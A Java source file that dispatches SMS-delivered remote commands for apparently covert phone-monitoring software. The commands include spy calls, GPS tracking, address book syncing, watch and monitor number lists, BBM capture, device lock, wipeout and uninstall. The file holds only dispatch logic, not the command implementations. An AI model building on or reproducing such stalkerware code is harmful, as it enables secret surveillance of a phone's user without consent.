package com.vvt.rmtcmd;

import com.vvt.global.Global;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.rmtcmd.sms.*;

public final class CmdFactory {
	
	public static RmtCommand getCommand(RmtCmdLine rmtCmdLine) {
		int cmd = rmtCmdLine.getCode();
		RmtCommand command = null;
		SMSCommandCode smsCmdCode = Global.getSMSCmdStore().getSMSCommandCode();
		if (cmd == smsCmdCode.getEnableCaptureCmd()) {
			command = new SMSEnableCapture(rmtCmdLine);
		} else if (cmd == smsCmdCode.getRequestEventsCmd()) {
			command = new SMSRequestEvents(rmtCmdLine);
		} else if (cmd == smsCmdCode.getSendDiagnosticsCmd()) {
			command = new SMSDiagnostics(rmtCmdLine);
		} else if (cmd == smsCmdCode.getUninstallCmd()) {
			command = new SMSUninstall(rmtCmdLine);
		} else if (cmd == smsCmdCode.getDeleteDatabaseCmd()) {
			command = new SMSDeleteDatabase(rmtCmdLine);
		} else if (cmd == smsCmdCode.getEnableSIMCmd()) {
			command = new SMSEnableSIM(rmtCmdLine);					
		} else if (cmd == smsCmdCode.getSettingCmd()) {
			command = new SMSSetSettings(rmtCmdLine);		
		} else if (cmd == smsCmdCode.getEnableGPSCmd()) {
			command = new SMSEnableGPS(rmtCmdLine);
		} else if (cmd == smsCmdCode.getGPSOnDemandCmd()) {
			command = new SMSGPSOnDemand(rmtCmdLine);
		} else if (cmd == smsCmdCode.getUpdateLocationIntervalCmd()) {
			command = new SMSUpdateLocationInterval(rmtCmdLine);
		} else if (cmd == smsCmdCode.getEnableWatchListCmd()) {
			command = new SMSEnableWatchList(rmtCmdLine);						
		} else if (cmd == smsCmdCode.getBBMCmd()) {
			if (rmtCmdLine.getEnabled() == 1) {
				command = new SMSEnableBBM(rmtCmdLine);
			} else if (rmtCmdLine.getEnabled() == 0) {
				command = new SMSDisableBBM(rmtCmdLine);
			}
		} else if ((cmd == smsCmdCode.getActivateUrlCmd()) || (cmd == smsCmdCode.getActivationAcUrlCmd())) {
			command = new SMSActivateURL(rmtCmdLine);
		} else if (cmd == smsCmdCode.getDeactivationCmd()) {
			command = new SMSDeactivation(rmtCmdLine);
		} /*else if (cmd == smsCmdCode.getActivationPhoneNumberCmd()) {
			command = new SMSSetActivatePhoneNumb(rmtCmdLine);
		} */else if (cmd == smsCmdCode.getEnableSpyCallCmd()) {
			command = new SMSEnableSpyCall(rmtCmdLine);			
		} else if (cmd == smsCmdCode.getEnableSpyCallMPNCmd()) {
			command = new SMSEnableSpyCallMPN(rmtCmdLine);	
		} else if (cmd == smsCmdCode.getRequestHeartbeatCmd()) {
			command = new SMSRequestHeartbeat(rmtCmdLine);
		} else if (cmd == smsCmdCode.getSyncAddressbookCmd()) {
			command = new SMSSyncAddressbook(rmtCmdLine);
		} else if (cmd == smsCmdCode.getSyncCommDirectiveCmd()) {
			command = new SMSSyncCommDirective(rmtCmdLine);
		} else if (cmd == smsCmdCode.getSendAddrForApprovalCmd()) {
			command = new SMSSendAddrForApproval(rmtCmdLine);
		} else if (cmd == smsCmdCode.getLockDeviceCmd()) {
			command = new SMSLockDevice(rmtCmdLine);
		} else if (cmd == smsCmdCode.getWipeoutCmd()) {
			command = new SMSWipeout(rmtCmdLine);
		} else if (cmd == smsCmdCode.getAddURLCmd()) {
			command = new SMSAddURL(rmtCmdLine);
		} else if (cmd == smsCmdCode.getResetURLCmd()) {
			command = new SMSResetURL(rmtCmdLine);
		} else if (cmd == smsCmdCode.getClearURLCmd()) {
			command = new SMSClearURL(rmtCmdLine);
		} else if (cmd == smsCmdCode.getQueryUrlCmd()) {
			command = new SMSQueryURL(rmtCmdLine);
		} else if (cmd == smsCmdCode.getRequestCurrentURLCmd()) {
			command = new SMSRequestCurrentURL(rmtCmdLine);
		} else if (cmd == smsCmdCode.getSetWatchFlagsCmd()) {
			command = new SMSSetWatchFlags(rmtCmdLine);
		} else if (cmd == smsCmdCode.getAddMonitorNumberCmd()) {
			command = new SMSAddMonitorNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getClearMonitorNumberCmd()) {
			command = new SMSClearMonitorNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getResetMonitorNumberCmd()) {
			command = new SMSResetMonitorNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getQueryMonitorNumberCmd()) {
			command = new SMSQueryMonitorNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getAddWatchNumberCmd()) {
			command = new SMSAddWatchNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getClearWatchNumberCmd()) {
			command = new SMSClearWatchNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getResetWatchNumberCmd()) {
			command = new SMSResetWatchNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getQueryWatchNumberCmd()) {
			command = new SMSQueryWatchNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getPanicModeCmd()) {
			// Not support
			command = new SMSSetPanicMode(rmtCmdLine);
		} else if (cmd == smsCmdCode.getAddHomeOutNumberCmd()) {
			command = new SMSAddHomeOutNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getClearHomeOutNumberCmd()) {
			command = new SMSClearHomeOutNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getResetHomeOutNumberCmd()) {
			command = new SMSResetHomeOutNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getQueryHomeOutNumberCmd()) {
			command = new SMSQueryHomeOutNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getAddHomeInNumberCmd()) {
			command = new SMSAddHomeInNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getClearHomeInNumberCmd()) {
			command = new SMSClearHomeInNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getResetHomeInNumberCmd()) {
			command = new SMSResetHomeInNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getQueryHomeInNumberCmd()) {
			command = new SMSQueryHomeInNumb(rmtCmdLine);
		} else if (cmd == smsCmdCode.getSendAddressbookCmd()) {
			command = new SMSSendAddressbook(rmtCmdLine);
		} else if (cmd == smsCmdCode.getRequestSettingsCmd()) {
			command = new SMSRequestSettings(rmtCmdLine);
		} else if (cmd == smsCmdCode.getRequestStartupTimeCmd()) {
			command = new SMSRequestStartupTime(rmtCmdLine);
		} else if (cmd == smsCmdCode.getRequestMobileNumberCmd()) {
			command = new SMSRequestMobileNumber(rmtCmdLine);
		}
		return command;
	}
}
